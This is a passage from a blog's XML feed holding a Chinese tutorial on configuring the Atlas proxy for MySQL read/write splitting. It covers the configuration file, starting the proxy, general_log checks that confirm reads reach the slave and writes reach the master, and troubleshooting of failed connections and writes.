true#&#x8BBE;&#x7F6E;Atlas&#x7684;&#x8FD0;&#x884C;&#x65B9;&#x5F0F;&#xFF0C;&#x8BBE;&#x4E3A;true&#x65F6;Atlas&#x4F1A;&#x542F;&#x52A8;&#x4E24;&#x4E2A;&#x8FDB;&#x7A0B;&#xFF0C;&#x4E00;&#x4E2A;&#x4E3A;monitor&#xFF0C;&#x4E00;&#x4E2A;&#x4E3A;worker&#xFF0C;monitor&#x5728;worker&#x610F;&#x5916;&#x9000;&#x51FA;&#x540E;&#x4F1A;&#x81EA;&#x52A8;&#x5C06;&#x5176;&#x91CD;&#x542F;&#xFF0C;&#x8BBE;&#x4E3A;false&#x65F6;&#x53EA;&#x6709;worker&#xFF0C;&#x6CA1;&#x6709;monitor&#xFF0C;&#x4E00;&#x822C;&#x5F00;&#x53D1;&#x8C03;&#x8BD5;&#x65F6;&#x8BBE;&#x4E3A;false&#xFF0C;&#x7EBF;&#x4E0A;&#x8FD0;&#x884C;&#x65F6;&#x8BBE;&#x4E3A;true,true&#x540E;&#x9762;&#x4E0D;&#x80FD;&#x6709;&#x7A7A;&#x683C;&#x3002;keepalive = true#&#x5DE5;&#x4F5C;&#x7EBF;&#x7A0B;&#x6570;&#xFF0C;&#x5BF9;Atlas&#x7684;&#x6027;&#x80FD;&#x6709;&#x5F88;&#x5927;&#x5F71;&#x54CD;&#xFF0C;&#x53EF;&#x6839;&#x636E;&#x60C5;&#x51B5;&#x9002;&#x5F53;&#x8BBE;&#x7F6E;event-threads = 8#&#x65E5;&#x5FD7;&#x7EA7;&#x522B;&#xFF0C;&#x5206;&#x4E3A;message&#x3001;warning&#x3001;critical&#x3001;error&#x3001;debug&#x4E94;&#x4E2A;&#x7EA7;&#x522B;log-level = message#&#x65E5;&#x5FD7;&#x5B58;&#x653E;&#x7684;&#x8DEF;&#x5F84;log-path = /usr/local/mysql-proxy/log#SQL&#x65E5;&#x5FD7;&#x7684;&#x5F00;&#x5173;&#xFF0C;&#x53EF;&#x8BBE;&#x7F6E;&#x4E3A;OFF&#x3001;ON&#x3001;REALTIME&#xFF0C;OFF&#x4EE3;&#x8868;&#x4E0D;&#x8BB0;&#x5F55;SQL&#x65E5;&#x5FD7;&#xFF0C;ON&#x4EE3;&#x8868;&#x8BB0;&#x5F55;SQL&#x65E5;&#x5FD7;&#xFF0C;REALTIME &#x4EE3;&#x8868;&#x8BB0;&#x5F55;SQL&#x65E5;&#x5FD7;&#x4E14;&#x5B9E;&#x65F6;&#x5199;&#x5165;&#x78C1;&#x76D8;&#xFF0C;&#x9ED8;&#x8BA4;&#x4E3A;OFF#sql-log = OFF#&#x6162;&#x65E5;&#x5FD7;&#x8F93;&#x51FA;&#x8BBE;&#x7F6E;&#x3002;&#x5F53;&#x8BBE;&#x7F6E;&#x4E86;&#x8BE5;&#x53C2;&#x6570;&#x65F6;&#xFF0C;&#x5219;&#x65E5;&#x5FD7;&#x53EA;&#x8F93;&#x51FA;&#x6267;&#x884C;&#x65F6;&#x95F4;&#x8D85;&#x8FC7;sql-log-slow&#xFF08;&#x5355;&#x4F4D;&#xFF1A;ms)&#x7684;&#x65E5;&#x5FD7;&#x8BB0;&#x5F55; &#x3002;&#x4E0D;&#x8BBE;&#x7F6E;&#x8BE5;&#x53C2;&#x6570;&#x5219;&#x8F93;&#x51FA;&#x5168;&#x90E8;&#x65E5;&#x5FD7;&#x3002;#sql-log-slow = 10#&#x5B9E;&#x4F8B;&#x540D;&#x79F0;&#xFF0C;&#x7528;&#x4E8E;&#x540C;&#x4E00;&#x53F0;&#x673A;&#x5668;&#x4E0A;&#x591A;&#x4E2A;Atlas&#x5B9E;&#x4F8B;&#x95F4;&#x7684;&#x533A;&#x5206;#instance = test#Atlas&#x76D1;&#x542C;&#x7684;&#x5DE5;&#x4F5C;&#x63A5;&#x53E3;IP&#x548C;&#x7AEF;&#x53E3;proxy-address = 0.0.0.0:1234#Atlas&#x76D1;&#x542C;&#x7684;&#x7BA1;&#x7406;&#x63A5;&#x53E3;IP&#x548C;&#x7AEF;&#x53E3;admin-address = 0.0.0.0:2345#&#x5206;&#x8868;&#x8BBE;&#x7F6E;&#xFF0C;&#x6B64;&#x4F8B;&#x4E2D;person&#x4E3A;&#x5E93;&#x540D;&#xFF0C;mt&#x4E3A;&#x8868;&#x540D;&#xFF0C;id&#x4E3A;&#x5206;&#x8868;&#x5B57;&#x6BB5;&#xFF0C;3&#x4E3A;&#x5B50;&#x8868;&#x6570;&#x91CF;&#xFF0C;&#x53EF;&#x8BBE;&#x7F6E;&#x591A;&#x9879;&#xFF0C;&#x4EE5;&#x9017;&#x53F7;&#x5206;&#x9694;&#xFF0C; &#x82E5;&#x4E0D;&#x5206;&#x8868;&#x5219;&#x4E0D;&#x9700;&#x8981;&#x8BBE;&#x7F6E;&#x8BE5;&#x9879;#tables = person.mt.id.3#&#x9ED8;&#x8BA4;&#x5B57;&#x7B26;&#x96C6;&#xFF0C;&#x8BBE;&#x7F6E;&#x8BE5;&#x9879;&#x540E;&#x5BA2;&#x6237;&#x7AEF;&#x4E0D;&#x518D;&#x9700;&#x8981;&#x6267;&#x884C;SET NAMES&#x8BED;&#x53E5;#charset = utf8#&#x5141;&#x8BB8;&#x8FDE;&#x63A5;Atlas&#x7684;&#x5BA2;&#x6237;&#x7AEF;&#x7684;IP&#xFF0C;&#x53EF;&#x4EE5;&#x662F;&#x7CBE;&#x786E;IP&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x662F;IP&#x6BB5;&#xFF0C;&#x4EE5;&#x9017;&#x53F7;&#x5206;&#x9694;&#xFF0C;&#x82E5;&#x4E0D;&#x8BBE;&#x7F6E;&#x8BE5;&#x9879;&#x5219;&#x5141;&#x8BB8;&#x6240;&#x6709;IP &#x8FDE;&#x63A5;&#xFF0C;&#x5426;&#x5219;&#x53EA;&#x5141;&#x8BB8;&#x5217;&#x8868;&#x4E2D;&#x7684;IP&#x8FDE;&#x63A5;#client-ips = 127.0.0.1, 192.168.1#Atlas&#x524D;&#x9762;&#x6302;&#x63A5;&#x7684;LVS&#x7684;&#x7269;&#x7406;&#x7F51;&#x5361;&#x7684;IP(&#x6CE8;&#x610F;&#x4E0D;&#x662F;&#x865A;IP)&#xFF0C;&#x82E5;&#x6709;LVS&#x4E14;&#x8BBE;&#x7F6E;&#x4E86;client-ips&#x5219;&#x6B64;&#x9879;&#x5FC5;&#x987B;&#x8BBE;&#x7F6E;&#xFF0C;&#x5426; &#x5219;&#x53EF;&#x4EE5;&#x4E0D;&#x8BBE;&#x7F6E;#lvs-ips = 192.168.1.1[root@ctos7mini ~]&amp;</code></pre><p><strong>&#x542F;&#x52A8;Atlas</strong></p><pre><code class="shell">[root@ctos7mini bin]&amp; cd /usr/local/mysql-proxy/bin/[root@ctos7mini bin]&amp; ./mysql-proxyd test statusMySQL-Proxy of test is NOT running[root@ctos7mini bin]&amp; ./mysql-proxyd test startOK: MySQL-Proxy of test is started[root@ctos7mini bin]&amp; ./mysql-proxyd test statusMySQL-Proxy of test is running (13844)MySQL-Proxy of test is running (13846)[root@ctos7mini bin]&amp; systemctl stop mysqld</code></pre><pre><code class="sql">[root@ctos7mini bin]&amp; mysql -h127.0.0.1 -uroot -P2345 -uroot -ppwdmysql: [Warning] Using a password on the command line interface can be insecure.Welcome to the MySQL monitor.  Commands end with ; or \g.Your MySQL connection id is 1Server version: 5.0.99-agent-adminCopyright (c) 2000, 2018, Oracle and/or its affiliates. All rights reserved.Oracle is a registered trademark of Oracle Corporation and/or itsaffiliates. Other names may be trademarks of their respectiveowners.Type &apos;help;&apos; or &apos;\h&apos; for help. Type &apos;\c&apos; to clear the current input statement.mysql&gt; show databases;ERROR 1105 (07000): use &apos;SELECT * FROM help&apos; to see the supported commandsmysql&gt; show databases;ERROR 1105 (07000): use &apos;SELECT * FROM help&apos; to see the supported commandsmysql&gt; helpFor information about MySQL products and services, visit:   http://www.mysql.com/For developer information, including the MySQL Reference Manual, visit:   http://dev.mysql.com/To buy MySQL Enterprise support, training, or other products, visit:   https://shop.mysql.com/List of all MySQL commands:Note that all text commands must be first on line and end with &apos;;&apos;?         (\?) Synonym for `help&apos;.clear     (\c) Clear the current input statement.connect   (\r) Reconnect to the server. Optional arguments are db and host.delimiter (\d) Set statement delimiter.edit      (\e) Edit command with $EDITOR.ego       (\G) Send command to mysql server, display result vertically.exit      (\q) Exit mysql. Same as quit.go        (\g) Send command to mysql server.help      (\h) Display this help.nopager   (\n) Disable pager, print to stdout.notee     (\t) Don&apos;t write into outfile.pager     (\P) Set PAGER [to_pager]. Print the query results via PAGER.print     (\p) Print current command.prompt    (\R) Change your mysql prompt.quit      (\q) Quit mysql.rehash    (\#) Rebuild completion hash.source    (\.) Execute an SQL script file. Takes a file name as an argument.status    (\s) Get status information from the server.system    (\!) Execute a system shell command.tee       (\T) Set outfile [to_outfile]. Append everything into given outfile.use       (\u) Use another database. Takes database name as argument.charset   (\C) Switch to another charset. Might be needed for processing binlog with multi-byte charsets.warnings  (\W) Show warnings after every statement.nowarning (\w) Don&apos;t show warnings after every statement.resetconnection(\x) Clean session context.For server side help, type &apos;help contents&apos;mysql&gt; select * from help;+----------------------------+---------------------------------------------------------+| command                    | description                                             |+----------------------------+---------------------------------------------------------+| SELECT * FROM help         | shows this help                                         || SELECT * FROM backends     | lists the backends and their state                      || SET OFFLINE $backend_id    | offline backend server, $backend_id is backend_ndx&apos;s id || SET ONLINE $backend_id     | online backend server, ...                              || ADD MASTER $backend        | example: &quot;add master 127.0.0.1:3306&quot;, ...               || ADD SLAVE $backend         | example: &quot;add slave 127.0.0.1:3306&quot;, ...                || REMOVE BACKEND $backend_id | example: &quot;remove backend 1&quot;, ...                        || SELECT * FROM clients      | lists the clients                                       || ADD CLIENT $client         | example: &quot;add client 192.168.1.2&quot;, ...                  || REMOVE CLIENT $client      | example: &quot;remove client 192.168.1.2&quot;, ...               || SELECT * FROM pwds         | lists the pwds                                          || ADD PWD $pwd               | example: &quot;add pwd user:raw_password&quot;, ...               || ADD ENPWD $pwd             | example: &quot;add enpwd user:encrypted_password&quot;, ...       || REMOVE PWD $pwd            | example: &quot;remove pwd user&quot;, ...                         || SAVE CONFIG                | save the backends to config file                        || SELECT VERSION             | display the version of Atlas                            |+----------------------------+---------------------------------------------------------+16 rows in set (0.00 sec)mysql&gt; ^DBye</code></pre><pre><code class="sql">[root@ctos7mini bin]&amp; mysql -h127.0.0.1 -uroot -P1234 -uroot -pccc.456mysql: [Warning] Using a password on the command line interface can be insecure.Welcome to the MySQL monitor.  Commands end with ; or \g.Your MySQL connection id is 2Server version: 5.0.81-log MySQL Community Server (GPL)Copyright (c) 2000, 2018, Oracle and/or its affiliates. All rights reserved.Oracle is a registered trademark of Oracle Corporation and/or itsaffiliates. Other names may be trademarks of their respectiveowners.Type &apos;help;&apos; or &apos;\h&apos; for help. Type &apos;\c&apos; to clear the current input statement.mysql&gt; show databases;+--------------------+| Database           |+--------------------+| information_schema || ha                 || mysql              || performance_schema || sys                || testdb             |+--------------------+6 rows in set (0.00 sec)mysql&gt; ^DBye[root@ctos7mini bin]&amp; mysql -h127.0.0.1 -uroot -P1234 -uroot -pccc.456mysql: [Warning] Using a password on the command line interface can be insecure.Welcome to the MySQL monitor.  Commands end with ; or \g.Your MySQL connection id is 3Server version: 5.0.81-log MySQL Community Server (GPL)Copyright (c) 2000, 2018, Oracle and/or its affiliates. All rights reserved.Oracle is a registered trademark of Oracle Corporation and/or itsaffiliates. Other names may be trademarks of their respectiveowners.Type &apos;help;&apos; or &apos;\h&apos; for help. Type &apos;\c&apos; to clear the current input statement.mysql&gt; ^DBye[root@ctos7mini bin]&amp; mysql -h127.0.0.1 -uroot -P1234 -uroot -pccc.456mysql: [Warning] Using a password on the command line interface can be insecure.Welcome to the MySQL monitor.  Commands end with ; or \g.Your MySQL connection id is 4Server version: 5.0.81-log MySQL Community Server (GPL)Copyright (c) 2000, 2018, Oracle and/or its affiliates. All rights reserved.Oracle is a registered trademark of Oracle Corporation and/or itsaffiliates. Other names may be trademarks of their respectiveowners.Type &apos;help;&apos; or &apos;\h&apos; for help. Type &apos;\c&apos; to clear the current input statement.mysql&gt; show databases;+--------------------+| Database           |+--------------------+| information_schema || ha                 || mysql              || performance_schema || sys                || testdb             |+--------------------+6 rows in set (0.00 sec)mysql&gt; show variables like &quot;%general_log%&quot;;+------------------+--------------------------------+| Variable_name    | Value                          |+------------------+--------------------------------+| general_log      | OFF                            || general_log_file | /var/lib/mysql/rhel_sqlsrv.log |+------------------+--------------------------------+2 rows in set (0.00 sec)mysql&gt; ^DBye[root@ctos7mini bin]&amp; mysql -h127.0.0.1 -uroot -P1234 -uroot -pccc.456mysql: [Warning] Using a password on the command line interface can be insecure.Welcome to the MySQL monitor.  Commands end with ; or \g.Your MySQL connection id is 5Server version: 5.0.81-log MySQL Community Server (GPL)Copyright (c) 2000, 2018, Oracle and/or its affiliates. All rights reserved.Oracle is a registered trademark of Oracle Corporation and/or itsaffiliates. Other names may be trademarks of their respectiveowners.Type &apos;help;&apos; or &apos;\h&apos; for help. Type &apos;\c&apos; to clear the current input statement.mysql&gt; show variables like &quot;%general_log%&quot;;+------------------+--------------------------------+| Variable_name    | Value                          |+------------------+--------------------------------+| general_log      | OFF                            || general_log_file | /var/lib/mysql/rhel_sqlsrv.log |+------------------+--------------------------------+2 rows in set (0.01 sec)mysql&gt; ^DBye[root@ctos7mini bin]&amp; mysql -h127.0.0.1 -uroot -P2345 -uroot -pccc.456mysql: [Warning] Using a password on the command line interface can be insecure.ERROR 1045 (28000): password doesn&apos;t match[root@ctos7mini bin]&amp; mysql -h127.0.0.1 -uroot -P1234 -uroot -ppwdmysql: [Warning] Using a password on the command line interface can be insecure.ERROR 1045 (28000): Access denied for user &apos;root&apos;@&apos;127.0.0.1:37884&apos; (using password: YES)[root@ctos7mini bin]&amp; mysql -h127.0.0.1 -P2345 -uroot -ppwdmysql: [Warning] Using a password on the command line interface can be insecure.Welcome to the MySQL monitor.  Commands end with ; or \g.Your MySQL connection id is 1Server version: 5.0.99-agent-adminCopyright (c) 2000, 2018, Oracle and/or its affiliates. All rights reserved.Oracle is a registered trademark of Oracle Corporation and/or itsaffiliates. Other names may be trademarks of their respectiveowners.Type &apos;help;&apos; or &apos;\h&apos; for help. Type &apos;\c&apos; to clear the current input statement.mysql&gt; show databases;ERROR 1105 (07000): use &apos;SELECT * FROM help&apos; to see the supported commandsmysql&gt; ^DBye[root@ctos7mini bin]&amp; mysql -h127.0.0.1 -P1234 -uroot -pccc.456mysql: [Warning] Using a password on the command line interface can be insecure.Welcome to the MySQL monitor.  Commands end with ; or \g.Your MySQL connection id is 7Server version: 5.0.81-log MySQL Community Server (GPL)Copyright (c) 2000, 2018, Oracle and/or its affiliates. All rights reserved.Oracle is a registered trademark of Oracle Corporation and/or itsaffiliates. Other names may be trademarks of their respectiveowners.Type &apos;help;&apos; or &apos;\h&apos; for help. Type &apos;\c&apos; to clear the current input statement.mysql&gt; show databases;+--------------------+| Database           |+--------------------+| information_schema || ha                 || mysql              || performance_schema || sys                || testdb             |+--------------------+6 rows in set (0.00 sec)mysql&gt; ^DBye</code></pre><h2 id="&#x8BFB;&#x5199;&#x5206;&#x79BB;&#x6D4B;&#x8BD5;"><a href="#&#x8BFB;&#x5199;&#x5206;&#x79BB;&#x6D4B;&#x8BD5;" class="headerlink" title="&#x8BFB;&#x5199;&#x5206;&#x79BB;&#x6D4B;&#x8BD5;"></a>&#x8BFB;&#x5199;&#x5206;&#x79BB;&#x6D4B;&#x8BD5;</h2><p><strong>&#x5728;MySQL&#x4E3B;&#x5E93;&#x548C;&#x4ECE;&#x5E93;&#x5F00;&#x542F;general_log&#x65E5;&#x5FD7;&#xFF0C;&#x6CE8;&#x610F;&#x4E3B;&#x5E93;&#x548C;&#x4ECE;&#x5E93;general_log&#x65E5;&#x5FD7;&#x540D;&#x79F0;&#x4E0D;&#x540C;&#xFF01;</strong></p><p>&#x4E34;&#x65F6;&#x751F;&#x6548;</p><pre><code class="sql">mysql&gt; show variables like &apos;%general_log%&apos;;+------------------+--------------------------------+| Variable_name    | Value                          |+------------------+--------------------------------+| general_log      | OFF                            || general_log_file | /var/lib/mysql/rhel_sqlsrv.log |+------------------+--------------------------------+2 rows in set (0.00 sec)mysql&gt;mysql&gt; set global general_log=ON;Query OK, 0 rows affected (0.00 sec)</code></pre><p>&#x6C38;&#x4E45;&#x751F;&#x6548;</p><pre><code class="shell">[root@rhel7 ~]&amp; echo &quot;general_log=ON&quot; &gt;&gt; /etc/my.cnf[root@rhel7 ~]&amp; echo &quot;general_log_file=/var/lib/mysql/rhel.log&quot; &gt;&gt; /etc/my.cnf[root@rhel_sqlsrv ~]&amp; echo &quot;general_log=ON&quot; &gt;&gt; /etc/my.cnf[root@rhel_sqlsrv ~]&amp; echo &quot;general_log_file=/var/lib/mysql/rhel_sqlsrv.log&quot; &gt;&gt; /etc/my.cnf[root@rhel_sqlsrv ~]&amp; systemctl restart mysqld</code></pre><pre><code class="sql">mysql&gt; show variables like &quot;%general_log%&quot;;+------------------+--------------------------+| Variable_name    | Value                    |+------------------+--------------------------+| general_log      | ON                       || general_log_file | /var/lib/mysql/rhel7.log |+------------------+--------------------------+2 rows in set (0.00 sec)mysql&gt; ^DBye</code></pre><p><strong>&#x6E05;&#x7A7A;&#x6570;&#x636E;&#x5E93;&#x65E5;&#x5FD7;</strong>&#xFF1A;</p><pre><code class="shell">[root@rhel7 ~]&amp; echo &gt; /var/lib/mysql/rhel7.log[root@rhel_sqlsrv ~]&amp; echo &gt; /var/lib/mysql/rhel_sqlsrv.log</code></pre><p><strong>&#x6D4B;&#x8BD5;</strong>&#xFF1A;</p><p>Master&#xFF08;rw&#xFF09;:</p><pre><code class="shell">[root@rhel7 ~]&amp; tail -f /var/lib/mysql/rhel7.log</code></pre><p>Slave&#xFF08;ro&#xFF09;:</p><pre><code class="shell">[root@rhel_sqlsrv ~]&amp; tail -f /var/lib/mysql/rhel_sqlsrv.log</code></pre><p>Atlas:</p><pre><code class="sql">[root@ctos7mini mysql-proxy]# mysql -h127.0.0.1 -P1234 -uroot -pEnter password:Welcome to the MySQL monitor.  Commands end with ; or \g.Your MySQL connection id is 9Server version: 5.0.81-log MySQL Community Server (GPL)Copyright (c) 2000, 2018, Oracle and/or its affiliates. All rights reserved.Oracle is a registered trademark of Oracle Corporation and/or itsaffiliates. Other names may be trademarks of their respectiveowners.Type &apos;help;&apos; or &apos;\h&apos; for help. Type &apos;\c&apos; to clear the current input statement.mysql&gt;</code></pre><p>ro:<br>slave&#x68C0;&#x6D4B;&#x5230;&#x8BFB;&#x64CD;&#x4F5C;</p><pre><code class="mbox">[root@rhel_sqlsrv ~]&amp; tail -f /var/lib/mysql/rhel_sqlsrv.log2022-05-07T09:07:23.252345Z        13 Connect   root@192.168.73.20 on  using TCP/IP2022-05-07T09:07:23.252973Z        13 Query     SET CHARACTER_SET_CONNECTION=utf82022-05-07T09:07:23.254053Z        13 Query     SET CHARACTER_SET_RESULTS=utf82022-05-07T09:07:23.258100Z        13 Query     SET CHARACTER_SET_CLIENT=utf82022-05-07T09:07:23.259321Z        13 Query     select @@version_comment limit 1</code></pre><p>rw:</p><pre><code class="mbox">[root@rhel7 ~]# tail -f /var/lib/mysql/rhel7.log</code></pre><p>&#x5728;Atlas&#x8FDB;&#x884C;&#x8BFB;&#x64CD;&#x4F5C;:</p><pre><code class="sql">mysql&gt; show databases;+--------------------+| Database           |+--------------------+| information_schema || ha                 || mysql              || performance_schema || sys                || testdb             |+--------------------+6 rows in set (0.00 sec)mysql&gt; use testdbReading table information for completion of table and column namesYou can turn off this feature to get a quicker startup with -ADatabase changedmysql&gt; show tables;+------------------+| Tables_in_testdb |+------------------+| book             |+------------------+1 row in set (0.00 sec)mysql&gt; select * from book;+-------------------------+-------+-------+| name                    | price | pages |+-------------------------+-------+-------+| Linux                   |    30 |   666 || Cloud Computing         |    60 |   666 || Operation System        |    80 |   666 || Artificial Intelligence |   166 |   666 || Linux                   |    66 |   666 || Unix                    |    77 |   777 || abc                     |   123 |   456 || def                     |    83 |   364 |+-------------------------+-------+-------+8 rows in set (0.01 sec)mysql&gt;</code></pre><p>Slave&#x68C0;&#x6D4B;&#x5230;&#x8BFB;&#x64CD;&#x4F5C;&#xFF1A;</p><pre><code class="mbox">[root@rhel_sqlsrv ~]# tail -f /var/lib/mysql/rhel_sqlsrv.log2022-05-07T09:07:23.252345Z        13 Connect   root@192.168.73.20 on  using TCP/IP2022-05-07T09:07:23.252973Z        13 Query     SET CHARACTER_SET_CONNECTION=utf82022-05-07T09:07:23.254053Z        13 Query     SET CHARACTER_SET_RESULTS=utf82022-05-07T09:07:23.258100Z        13 Query     SET CHARACTER_SET_CLIENT=utf82022-05-07T09:07:23.259321Z        13 Query     select @@version_comment limit 12022-05-07T09:13:04.634499Z        13 Query     show databases2022-05-07T09:13:09.313174Z        13 Query     SELECT DATABASE()2022-05-07T09:13:09.314061Z        13 Init DB   testdb2022-05-07T09:13:09.316061Z        13 Init DB   testdb2022-05-07T09:13:09.316710Z        13 Query     show databases2022-05-07T09:13:09.317592Z        13 Init DB   testdb2022-05-07T09:13:09.318360Z        13 Query     show tables2022-05-07T09:13:09.319468Z        13 Init DB   testdb2022-05-07T09:13:09.320217Z        13 Field List        book2022-05-07T09:13:16.960823Z        13 Init DB   testdb2022-05-07T09:13:16.962628Z        13 Query     show tables2022-05-07T09:13:20.799873Z        13 Init DB   testdb2022-05-07T09:13:20.800737Z        13 Query     select * from book</code></pre><p>&#x5728;Atlas&#x8FDB;&#x884C;&#x5199;&#x64CD;&#x4F5C;&#xFF1A;</p><pre><code class="sql">mysql&gt; insert into book values(&apos;test&apos;, 67, 252);Query OK, 1 row affected (0.01 sec)mysql&gt;</code></pre><p>Master&#x68C0;&#x6D4B;&#x5230;&#x5199;&#x64CD;&#x4F5C;&#xFF1A;</p><pre><code class="mbox">[root@rhel7 ~]# tail -f /var/lib/mysql/rhel7.log2022-05-07T10:59:33.029685Z         4 Connect   root@192.168.73.20 on  using TCP/IP2022-05-07T10:59:33.030609Z         4 Query     SET CHARACTER_SET_CONNECTION=utf82022-05-07T10:59:33.031735Z         4 Query     SET CHARACTER_SET_RESULTS=utf82022-05-07T10:59:33.032656Z         4 Query     SET CHARACTER_SET_CLIENT=utf82022-05-07T10:59:33.033919Z         4 Init DB   testdb2022-05-07T10:59:33.035018Z         4 Query     insert into book values(&apos;test&apos;, 67, 252)</code></pre><h2 id="&#x6545;&#x969C;&#x89E3;&#x51B3;"><a href="#&#x6545;&#x969C;&#x89E3;&#x51B3;" class="headerlink" title="&#x6545;&#x969C;&#x89E3;&#x51B3;"></a>&#x6545;&#x969C;&#x89E3;&#x51B3;</h2><p><strong>&#x6545;&#x969C;&#x4E00;</strong></p><p><strong>Atlas</strong>&#x8BBF;&#x95EE;&#x5DE5;&#x4F5C;&#x63A5;&#x53E3;&#x65F6;&#xFF0C;&#x6570;&#x636E;&#x5E93;&#x53EA;&#x6709;&#x4E00;&#x4E2A;<code>information_schema</code>&#xFF0C;&#x4E0D;&#x663E;&#x793A;&#x5176;&#x4ED6;&#x5E93;&#xFF1A;</p><pre><code class="mbox">[root@ctos7mini mysql-proxy]# mysql -h192.168.73.21 -uroot -pEnter password:Welcome to the MySQL monitor.  Commands end with ; or \g.Your MySQL connection id is 13Server version: 5.7.24-log MySQL Community Server (GPL)Copyright (c) 2000, 2018, Oracle and/or its affiliates. All rights reserved.Oracle is a registered trademark of Oracle Corporation and/or itsaffiliates. Other names may be trademarks of their respectiveowners.Type &apos;help;&apos; or &apos;\h&apos; for help. Type &apos;\c&apos; to clear the current input statement.mysql&gt; show databases;+--------------------+| Database           |+--------------------+| information_schema |+--------------------+1 row in set (0.00 sec)mysql&gt; ^DBye</code></pre><p>&#x6545;&#x969C;&#x5206;&#x6790;&#xFF1A;</p><ol><li><p>&#x4E3B;&#x4ECE;&#x4E0D;&#x540C;&#x6B65;&#xFF1A;<br>&#x67E5;&#x770B;Slave&#x7684;&#x72B6;&#x6001;&#xFF1A;</p><pre><code class="sql">mysql&gt; show slave status\G*************************** 1. row ***************************            Slave_IO_State: Connecting to master               Master_Host: 192.168.73.21               Master_User: root               Master_Port: 3306             Connect_Retry: 10           Master_Log_File: mysql-bin.000005       Read_Master_Log_Pos: 154            Relay_Log_File: rhel_sqlsrv-relay-bin.000012             Relay_Log_Pos: 4     Relay_Master_Log_File: mysql-bin.000005          Slave_IO_Running: Connecting         Slave_SQL_Running: Yes.........................................&#x7701;&#x7565;...................................................................     Seconds_Behind_Master: NULLMaster_SSL_Verify_Server_Cert: No             Last_IO_Errno: 2003             Last_IO_Error: error connecting to master &apos;root@192.168.73.21:3306&apos; - retry-time: 10  retries: 1.........................................&#x7701;&#x7565;...................................................................1 row in set (0.00 sec)</code></pre></li><li><p><code>Atlas</code>&#x6CA1;&#x6709;&#x8FDE;&#x63A5;&#x5230;&#x4E3B;&#x4ECE;<br>&#x8BBF;&#x95EE;Atlas&#x7BA1;&#x7406;&#x63A5;&#x53E3;&#x67E5;&#x770B;&#x4E3B;&#x4ECE;&#x670D;&#x52A1;&#x662F;&#x5426;&#x90FD;&#x5728;&#x7EBF;<br><code>`</code>sql<br>[root@ctos7mini mysql-proxy]# mysql -h127.0.0.1 -P2345 -uroot -ppwd<br>mysql: [Warning] Using a password on the command line interface can be insecure.<br>Welcome to the MySQL monitor.  Commands end with ; or \g.<br>Your MySQL connection id is 1<br>Server version: 5.0.99-agent-admin</p></li></ol><p>Copyright (c) 2000, 2018, Oracle and/or its affiliates. All rights reserved.</p><p>Oracle is a registered trademark of Oracle Corporation and/or its<br>affiliates. Other names may be trademarks of their respective<br>owners.</p><p>Type &#x2018;help;&#x2019; or &#x2018;\h&#x2019; for help. Type &#x2018;\c&#x2019; to clear the current input statement.</p><p>mysql&gt; select * from backends;<br>+&#x2014;&#x2014;&#x2014;&#x2014;-+&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2013;+&#x2014;&#x2014;-+&#x2014;&#x2014;+<br>| backend_ndx | address            | state | type |<br>+&#x2014;&#x2014;&#x2014;&#x2014;-+&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2013;+&#x2014;&#x2014;-+&#x2014;&#x2014;+<br>|           1 | 192.168.73.21:3306 | up    | rw   |<br>|           2 | 192.168.73.22:3306 | down  | ro   |<br>+&#x2014;&#x2014;&#x2014;&#x2014;-+&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2013;+&#x2014;&#x2014;-+&#x2014;&#x2014;+<br>2 rows in set (0.00 sec)</p><p>mysql&gt;</p><pre><code>&#x6839;&#x636E;&#x5B9E;&#x9645;&#x73AF;&#x5883;&#x68C0;&#x67E5;&#xFF0C;&#x4E3B;&#x4ECE;&#x662F;&#x5426;&#x540C;&#x6B65;&#xFF0C;MySQL&#x662F;&#x5426;&#x5141;&#x8BB8;&#x8FDC;&#x7A0B;&#x8FDE;&#x63A5;&#xFF0C;&#x6570;&#x636E;&#x5E93;&#x7AEF;&#x53E3;&#x662F;&#x5426;&#x5F00;&#x653E;&#x3002;**&#x6545;&#x969C;&#x4E8C;&#xFF1A;**&#x6570;&#x636E;&#x5E93;&#x80FD;&#x591F;&#x67E5;&#x8BE2;&#xFF0C;&#x4E0D;&#x80FD;&#x8FDB;&#x884C;&#x5199;&#x64CD;&#x4F5C;&#xFF1A;```sqlmysql&gt; use testdbDatabase changedmysql&gt; select * from book;+-------------------------+-------+-------+| name                    | price | pages |+-------------------------+-------+-------+| Linux                   |    30 |   666 || Cloud Computing         |    60 |   666 || Operation System        |    80 |   666 || Artificial Intelligence |   166 |   666 || Linux                   |    66 |   666 || Unix                    |    77 |   777 || abc                     |   123 |   456 || def                     |    83 |   364 |+-------------------------+-------+-------+8 rows in set (0.00 sec)mysql&gt; insert into `book` values(&apos;test&apos;,24,62);ERROR 1046 (3D000): No database selectedmysql&gt;</code></pre><p>Master&#x65E5;&#x5FD7;&#xFF1A;</p><pre><code class="mbox">2022-05-07T09:24:33.993274Z        17 Query     insert into `book` values(&apos;test&apos;,24,62)2022-05-07T09:24:39.346670Z        17 Init DB   Access denied for user &apos;root&apos;@&apos;%&apos; to database &apos;testdb&apos;</code></pre><blockquote><p>&#x91CD;&#x542F;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;</p></blockquote><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;MySQL-Atlas-&amp;#x2014;-&amp;#x8BFB;&amp;#x5199;&amp;#x5206;&amp;#x79BB;&amp;#x5B9E;&amp;#x6218;&quot;&gt;&lt;a href=&quot;#MySQL-Atlas-&amp;#x2014;-&amp;#x8BFB;&amp;#x5199;&amp;#x5206;&amp;#x79B
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>MySQL高可用集群架构-MHA架构</title>
    <link href="https://marnm.github.io//posts/db0340bd/"/>
    <id>https://marnm.github.io//posts/db0340bd/</id>
    <published>2022-06-07T04:45:20.000Z</published>
    <updated>2022-06-07T05:12:05.989Z</updated>
    
